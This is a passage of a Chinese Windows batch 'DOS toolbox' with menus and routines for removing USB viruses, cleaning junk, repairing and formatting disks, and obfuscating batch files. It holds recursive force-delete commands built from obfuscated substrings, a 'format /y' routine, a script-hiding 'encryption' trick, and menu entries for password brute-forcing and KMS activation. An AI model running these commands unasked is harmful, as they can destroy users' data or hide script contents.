if /i "!caidan!"=="js" set tzwz=d&goto 49
if /i "!caidan!"=="gx" set tzwz=d&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:e
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m5!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]文本浏览
echo [2]显示计算机与用户的设置
echo [3]NTFS压缩
echo [4]修改文件权限
echo [5]显示开机启动项
echo [6]语音阅读器
echo [7]批处理文件风险分析
echo [8]文件搜索
echo [9]修复已损坏的文件
echo [0]退出                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 37
if "!caidan!"=="2" goto 38
if "!caidan!"=="3" goto 39
if "!caidan!"=="4" goto 40
if "!caidan!"=="5" goto 41
if "!caidan!"=="6" goto 42
if "!caidan!"=="7" goto 43
if "!caidan!"=="8" goto 44
if "!caidan!"=="9" goto 45
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=e&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=e&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=e&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=e&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=e&goto kcd
if /i "!caidan!"=="gcd" set tzwz=e&goto gcd
if /i "!caidan!"=="xz" set tzwz=e&goto xz
if /i "!caidan!"=="js" set tzwz=e&goto 49
if /i "!caidan!"=="gx" set tzwz=e&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:f
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m6!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]暴力破解压缩包密码
echo [2]Wifi热点
echo [3]反编译chm文件
echo [4]关闭无响应进程
echo [5]文件比较器
echo [6]将文字写入剪切板
echo [7]打开系统服务设置
echo [8]已知年月日计算星期
echo [9]查询系统激活状态
echo [0]退出                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 46
if "!caidan!"=="2" goto 47
if "!caidan!"=="3" goto 48
if "!caidan!"=="4" set tzwz=f&goto 49
if "!caidan!"=="5" goto 50
if "!caidan!"=="6" goto 51
if "!caidan!"=="7" goto 52
if "!caidan!"=="8" goto 53
if "!caidan!"=="9" goto 54
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=f&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=f&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=f&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=f&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=f&goto kcd
if /i "!caidan!"=="gcd" set tzwz=f&goto gcd
if /i "!caidan!"=="xz" set tzwz=f&goto xz
if /i "!caidan!"=="js" set tzwz=f&goto 49
if /i "!caidan!"=="gx" set tzwz=f&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i !caidna!=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:g
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m7!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]创建指定文件的快捷方式到桌面
echo [2]打开系统配置
echo [3]字数统计
echo [4]创建符号链接
echo [5]打开管理控制台
echo [6]解除Streams文件锁定
echo [7]创建、删除或列出卷装入点
echo [8]注册表搜索
echo [9]Base64编解码
echo [0]退出                                             !cswz!42;97m%nx%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 55
if "!caidan!"=="2" goto 56
if "!caidan!"=="3" goto 57
if "!caidan!"=="4" goto 58
if "!caidan!"=="5" goto 59
if "!caidan!"=="6" goto 60
if "!caidan!"=="7" goto 61
if "!caidan!"=="8" goto 62
if "!caidan!"=="9" goto 63
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if "!caidan!"=="+" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="s" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=g&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=g&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=g&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=g&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=g&goto kcd
if /i "!caidan!"=="gcd" set tzwz=g&goto gcd
if /i "!caidan!"=="xz" set tzwz=g&goto xz
if /i "!caidan!"=="js" set tzwz=g&goto 49
if /i "!caidan!"=="gx" set tzwz=g&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i "!caidan!"=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:h
set color=
set color1=f
set/a color=%random%%%5
if %color%==0 set ysbak=40;97m
if %color%==1 set ysbak=44;97m
if %color%==2 set color=5&set ysbak=45;97m
if %color%==3 set ysbak=46;97m
if %color%==4 set color=7&set color1=8&set ysbak=47;90m
color %color%%color1%
if exist %temp%\dostoolupdate (
for /f "delims=: tokens=1" %%a in (%temp%\dostoolupdate) do (
set /a gxjg=%%a-!ver!
if !gxjg! gtr 0 (set gxflag= - 检查到更新版本: %%a
for /f "delims=: tokens=2" %%b in (%temp%\dostoolupdate) do (set doshash="%%b")))
del /f /q %temp%\dostoolupdate)
title DOS工具箱%system%%gxflag%
cls
echo                                     菜单 - 第!cswz!!ysbak:~0,3!92m8!cswz!!ysbak!页
echo 现在是%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%
echo _______________________________________________________________________________
echo [1]8.3短文件名管理
echo [2]智能NTFS压缩
echo [3]计算文件哈希值
echo [4]显示货币汇率
echo [5]创建虚拟盘符
echo [6]解压msi安装文件
echo [7]生成CMD控制台色彩表
echo [8]KMS激活Windows 10
echo [0]退出                                                      !cswz!42;97m%nx7%!cswz!!ysbak!
echo _______________________________________________________________________________
set caidan=
set/p caidan=请输入你的选择:
if "!caidan!"=="1" goto 64
if "!caidan!"=="2" goto 65
if "!caidan!"=="3" goto 66
if "!caidan!"=="4" goto 67
if "!caidan!"=="5" goto 68
if "!caidan!"=="6" goto 69
if "!caidan!"=="7" goto 70
if "!caidan!"=="8" goto 71
if "!caidan!"=="0" goto 00
if "!caidan!"=="-" goto memuv2
if /i "!caidan!"=="a" goto memuv2
if /i "!caidan!"=="vbsjsq" set tzwz=h&goto vbsjsq
if /i "!caidan!"=="guanji" set tzwz=h&goto guanji
if "!caidan!"=="BATJIAMI" set tzwz=h&goto batjiami
if /i "!caidan!"=="guanyu" set tzwz=h&goto guanyu
if /i "!caidan!"=="csh" goto chushihua
if /i "!caidan!"=="kcd" set tzwz=h&goto kcd
if /i "!caidan!"=="gcd" set tzwz=h&goto gcd
if /i "!caidan!"=="xz" set tzwz=h&goto xz
if /i "!caidan!"=="js" set tzwz=h&goto 49
if /i "!caidan!"=="gx" set tzwz=a&goto update
if /i "!caidan!"=="go1" goto memuv2
if /i "!caidan!"=="go2" goto memuv2
if /i "!caidan!"=="go3" goto memuv2
if /i "!caidan!"=="go4" goto memuv2
if /i "!caidan!"=="go5" goto memuv2
if /i "!caidan!"=="go6" goto memuv2
if /i "!caidan!"=="go7" goto memuv2
if /i !caidna!=="go8" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto memuv2
:01
title 清除U盘里的lpk.dll病毒%system%
cls
echo 按任意键开始清除lpl.dll病毒&pause>nul
cls
echo 正在搜索可移动磁盘...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%h in (%sypf%) do (
fsutil fsinfo drivetype %%h|find /i "可移动驱动器"&&goto 01-1)
cls
echo 没有找到可移动磁盘
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:01-1
cls
echo 正在清除lpk.dll病毒...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%h in (%sypf%) do fsutil fsinfo drivetype %%h|find /i "可移动驱动器"&&for /f "delims=" %%i in ('"dir/a/s/b %%hlpk.dll"') do if %%~zi==44032 attrib -s -h -r "%%i"|del/f/q "%%i"|echo 已删除%%i
echo _______________________________________________________________________________
echo 清除完成
echo 按任意键返回菜单&pause>nul
goto memuv2
:02
title 清除U盘里的jwgkvsq.vmx病毒，并免疫该病毒%system%
cls
echo 按任意键开始清除jwgkvsq.vmx病毒&pause>nul
cls
echo 正在搜索可移动磁盘...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%j in (%sypf%) do (
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&goto 02-1)
cls
echo 没有找到可移动磁盘
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:02-1
cls
echo 正在清除jwgkvsq.vmx病毒...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%j in (%sypf%) do (
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&takeown/f "%%jautorun.inf"
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&echo y|cacls "%%jautorun.inf" /t /c /p everyone:f
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&takeown/f "%%jRECYLER"
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&echo y|cacls "%%jRECYCLER" /t /c /p everyone:f
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&attrib -s -h -r "%%jautorun.inf"
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&del/f/q "%%jautorun.inf"
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&rd/s/q "%%jRECYCLER"
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&del/f/q "%%jRECYCLER"
fsutil fsinfo drivetype %%j|find /i "可移动驱动器"&&echo jwgkvsq.vmx病毒免疫文件，请勿删除！>"%%jRECYCLER")
echo _______________________________________________________________________________
echo 清除完成
echo 按任意键返回菜单&pause>nul
goto memuv2
:03
title 清理系统垃圾%system%
cls
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.tm%ad%p
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*._mp
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\~*.*
goto 03(1)
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.syd
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.spc
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.cdr_
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.#res
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.---
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.$$$
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.@@@
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.??$
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.??~
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.~*
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\mscreate.dir
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\chklist.*
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.ftg
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.fts
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.err
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.prv
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.ms
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.wbk
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.xlk
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.diz
:03(1)
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*log.txt
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.dmp
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.log
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.gid
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.chk
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\*.old
%sc:~0,3%/f%ad%/s/%ad%q %systemdrive%\recycled\*.*
%sc:~0,3%/f%ad%/s/%ad%q %windir%\*.bak
%sc:~0,3%/f%ad%/s/%ad%q %windir%\prefetch\*.*
%scw:~0,2%/s/q %windir%\temp & md %windir%\temp
%sc:~0,3%/f%ad%/s/%ad%q/f/q %userprofile%\cookies\*.*
%sc:~0,3%/f%ad%/s/%ad%q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
%sc:~0,3%/f%ad%/s/%ad%q "%userprofile%\Local Settings\Temp\*.*"
%sc:~0,3%/f%ad%/s/%ad%q "%userprofile%\recent\*.*"
echo _______________________________________________________________________________
echo 清理完成
echo 按任意键返回菜单&pause>nul
goto memuv2
:04
title 显示系统信息%system%
cls
systeminfo
mode
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:05
title 解除任务管理器被禁用%system%
cls
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t reg_dword /d 00000000 /f
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:06
title 显示被隐藏文件(中了该类病毒后)%system%
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:07
title 解除注册表被禁用%system%
cls
echo [Version]>%systemdrive%\windows\temp\reg.inf
echo Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo [DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo [del]>>%systemdrive%\windows\temp\reg.inf
echo HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
del/f/q %systemdrive%\windows\temp\reg.inf
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:08
title 计算开平方%system%
cls
set w=0
set s=0
set/p s=请输入被开平方的数:
set s=%s:|=%
for /f "delims=0123456789" %%a in ('echo %s%') do goto kpfcw
set/p w=精确到小数点后几位数:
set w=%w:|=%
for /f "delims=0123456789" %%a in ('echo %w%') do goto xswscw
set wbak=%w%
set sbak=%s%
if defined W (for /l %%i in (1 1 %W%) do set "s=!s!00") else set W=0
set p=!s!&set /a len=N=0
for %%i in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do IF "!p:~%%i!" NEQ "" set/a len+=%%i&set "p=!p:~%%i!"
set /a "N-=~(len%%2)"
set M=!s:~,%N%!
for /l %%i in (1 1 9) do set/a Mx=%%i*%%i&if !Mx! leq !M! set/a "i=%%i,j=100+M-Mx"
set /a "len-=1,Len_i=_N=i/5+1,p=i*20"
set j=!j:~-%_N%!&set p=0!p!&set kl=0000000
set /a _N=8-_N
for /l %%i in (%N% 2 !len!) do (
set "j=!j!!s:~%%i,2!"
if "!j:0=!" neq "" (
set /a Ln_i=Len_i+=2
if "!p!" lss "!j!" (
set d=Z&set in=!kl!!P!&set /a Ln_i+=7
for /l %%j in (9 -1 2) do (
if "!d!" gtr "!j!" (
set "x=%%j"
set d=&set /a "b=x*x"
for /l %%k in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%k,8!*%%j+b"
set d=!b:~-8!!d!&set /a "b=!b:~,-8!-%%j"
)
set d=!b!!d!
for %%k in (!Len_i!) do set "d=!d:~-%%k!"
)
)
if "!d!" gtr "!j!" (set d=!in!&set x=1&set b=1) else set d=!kl!!d!&set b=0
set j=!kl!!j!&set "t="
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=3!j:~-%%j,8!-1!d:~-%%j,8!-!b:~,1!%%2"
set "t=!b:~1!!t!"
)
for %%j in (!Len_i!) do set "j=!t:~-%%j!"
set "j=!j:~1!" ) else set "x=0"
set /a "Len_i-=1"
if "!x!" neq "0" (
if "!x!" geq "5" (
set p=&set b=0&set "in=!kl!!i!!x!"
set /a "Ln_i=Len_i+_N"
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%j,8!*2+!b:~,1!%%2"
set p=!b:~1!!p!
)
set /a "b=!b:~,1!%%2"
for %%j in (!Len_i!) do set "p=!b:1=01!!p:~-%%j!0"
) else set /a t=x*2&set "p=!p:~,-1!!t!0"
) else set p=!p!0&set "j=!j:~1!"
) else set j=!j:~1!&set p=!p!0&set /a "Len_i+=1,x=0"
set i=!i!!x!
)
for /f "tokens=* delims=." %%i in ("!i:~,-%W%!.!i:~-%W%!") do set sqrt=%%i
cls
echo %sbak%的开平方结果是(精确到小数点后%wbak%位):
echo %sqrt%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:kpfcw
echo 不是有效数字!
ping/n 2 0.0>nul
goto 08
:xswscw
echo 不是有效数字!
ping/n 2 0.0>nul
goto 08
:09
title 命令提示符%system%
cls
ver
if !winv! equ 0 (cmd /k prompt !cswz!!ysbak:~0,3!92m%username%!cswz!!ysbak!@%hostname%:$p#$s) else (cmd /k prompt %username%@%hostname%:$p#$s)
goto memuv2
:10
title 将磁盘格式转换为NTFS%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
echo 如果不能正常转换，请使用磁盘错误修复
set zhuanhuancipan=
set/p zhuanhuancipan=请输入需要转换的盘符:
cls
convert %zhuanhuancipan%:/fs:ntfs
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:11
title 磁盘修复%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set cipanxioufu=
set/p cipanxioufu=请输入需要修复的盘符:
cls
fsutil fsinfo ntfsinfo %cipanxioufu%:>nul 2>nul
if "%errorlevel%"=="0" (chkdsk /x /f /sdcleanup %cipanxioufu%:) else (chkdsk /f /x %cipanxioufu%:)
echo _______________________________________________________________________________
echo 修复完成
echo 按任意键返回菜单&pause>nul
goto memuv2
:12
color cf
title 格式化%system%
echo 
cls
set geshihuaxuanxiang=
set/p geshihuaxuanxiang=格式化有一定的危险性，是否继续(y/n):
set geshihuaxuanxiang="%geshihuaxuanxiang:|=%"
if /i !geshihuaxuanxiang!=="y" goto 12(1)
if /i !geshihuaxuanxiang!=="n" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 12
:12(1)
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set geshihua=
set/p geshihua=请输入需要格式化的盘符:
cls
label %geshihua%: format
format %geshihua%:/x/q/v:format/y
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:batjiami
color 0a
title bat加密%system%
cls
echo 此工具只可以用于纯文本文件加密
echo _______________________________________________________________________________
echo [1]文件加密(方法1)
echo [2]文件解密
echo [3]文件加密(方法2)(推荐使用)
echo [0]返回菜单
echo _______________________________________________________________________________
set batjmxx=
set/p batjmxx=请输入你的选择:
if "!batjmxx!"=="1" goto batjiami(1)
if "!batjmxx!"=="2" goto batjiami(2)
if "!batjmxx!"=="3" goto batjiami(3)
if "!batjmxx!"=="0" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto batjiami
:batjiami(1)
title 文件加密(方法1)%system%
del/f/q %systemdrive%linshiwenjian.tmp>nul
cls
echo 文件加密(方法1)
echo _______________________________________________________________________________
echo 加密文件会在桌面生成(e=返回):
echo _______________________________________________________________________________
set jiami=
set/p jiami=拖动需要加密的文件到此窗口:
if /i "!jiami!"=="e" goto batjiami
if "!jiami:~0,1!!jiami:~-1!" neq """" for /f "delims=" %%a in ('"echo !jiami!"') do (set !jiami!="%%~a")
:batpd
cls
for /f "delims=" %%a in ("!jiami!") do set jmdx=%%~za
set/a batpdjg=!jmdx!%%2
if "!batpdjg!"=="1" goto jiamipause
if "!batpdjg!"=="0" goto beiyongjiamipause
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto batjiami(1)
:jiamipause
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.bat set geshi=bat&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.txt set geshi=txt&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.log set geshi=log&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.inf set geshi=inf&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.cmd set geshi=cmd&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.ini set geshi=ini&set wjm=%%~ne&goto batjiami(1)(1)
for /f "delims=" %%e in ("!jiami!") do if %%~xe==.lrc set geshi=lrc&set wjm=%%~ne&goto batjiami(1)(1)
echo 无效的文件格式！
ping/n 2 0.0>nul
goto batjiami(1)
:batjiami(1)(1)
copy/y "!jiami!" %systemdrive%linshiwenjian.tmp
echo %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a >%systemdrive%1.tmp
echo cls>%systemdrive%2.tmp
copy/b %systemdrive%1.tmp+%systemdrive%2.tmp+%systemdrive%linshiwenjian.tmp "%zmlj%已加密的%wjm%.%geshi%"
del/f/q %systemdrive%1.tmp
del/f/q %systemdrive%2.tmp
del/f/q %systemdrive%linshiwenjian.tmp
cls
echo _______________________________________________________________________________
echo 加密完成
ping/n 2 0.0>nul
goto batjiami
:batjiami(2)
title 文件解密%system%
del/f/q %systemdrive%linshiwenjian.tmp>nul
cls
echo 文件解密
echo _______________________________________________________________________________
echo 解密文件会在桌面生成(e=返回)
echo _______________________________________________________________________________
set jiemi=
set/p jiemi=拖动需要解密的文件到此窗口:
if /i "!jiemi!"=="e" goto batjiami
if "!jiemi:~0,1!!jiemi:-1!" neq """" for /f "delims=" %%a in ('"echo !jiemi!"') do (set !jiemi!="%%~a")
:jiemipause
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.bat set geshi=bat&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.txt set geshi=txt&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.log set geshi=log&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.inf set geshi=inf&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.cmd set geshi=cmd&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.ini set geshi=ini&set wjm=%%~nf&goto batjiami(2)(1)
for /f "delims=" %%f in ("!jiemi!") do if %%~xf==.lrc set geshi=lrc&set wjm=%%~nf&goto batjiami(2)(1)
echo 无效的文件格式！
ping/n 2 0.0>nul
goto batjiami(2)
:batjiami(2)(1)
copy/y "!jiemi!" %systemdrive%linshiwenjian.tmp
echo;>%systemdrive%3.tmp
copy/b %systemdrive%3.tmp+%systemdrive%linshiwenjian.tmp "%zmlj%已解密的%wjm%.%geshi%"
del/f/q 3.tmp
del/f/q %systemdrive%linshiwenjian.tmp
cls
echo _______________________________________________________________________________
echo 解密完成
ping/n 2 0.0>nul
goto batjiami
:beiyongjiamipause
del/f/q %systemdrive%linshiwenjian.tmp>nul
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.bat set geshi=bat&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.txt set geshi=txt&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.log set geshi=log&set wjm=%%~ng&goto beiyongjiami(1)
